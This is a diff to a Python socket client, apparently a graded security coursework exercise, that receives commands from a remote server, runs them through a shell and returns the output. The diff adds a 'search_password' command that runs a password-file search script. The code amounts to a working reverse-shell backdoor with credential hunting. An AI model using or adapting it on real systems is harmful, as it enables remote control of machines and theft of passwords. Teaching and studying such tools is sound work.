@@ -1,3 +1,4 @@
+import platform
 import socket
 import subprocess
 from shared import server_ip, server_port
@@ -20,22 +21,28 @@ def main():
 # the server.
         command = client_socket.recv(1024).decode()
         command = command.strip()
-
-
+        
+        if command.split(" ")[0] == 'search_password':
+            try:
+                output = subprocess.check_output(f"{"BASH search_password_file.sh" if platform.system() == "Windows" else "./search_password_file.sh"} {command.split(" ")[1]}", shell=True, stderr=subprocess.STDOUT)
+            except subprocess.CalledProcessError as e:
+                output = e.stdout
+       
         # If the command is "end", break the loop        
-        if command == 'end':
+        elif command == 'end':
             break
 
-         # 3. Execute command [1 Mark]
-            # a. Implement command execution functionality using the subprocess
-           # library.
-        try:
-            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-        except subprocess.CalledProcessError as e:
-#             4. Capture errors or response from command and send to server [2 Marks]
-# a. The client should capture the output or any errors from the executed
-# command and send this information back to the server.
-            output = e.stdout
+        else:
+            # 3. Execute command [1 Mark]
+                # a. Implement command execution functionality using the subprocess
+            # library.
+            try:
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+            except subprocess.CalledProcessError as e:
+    #             4. Capture errors or response from command and send to server [2 Marks]
+    # a. The client should capture the output or any errors from the executed
+    # command and send this information back to the server.
+                output = e.stdout
 
         # Send the command output back to the client
         client_socket.send(output)
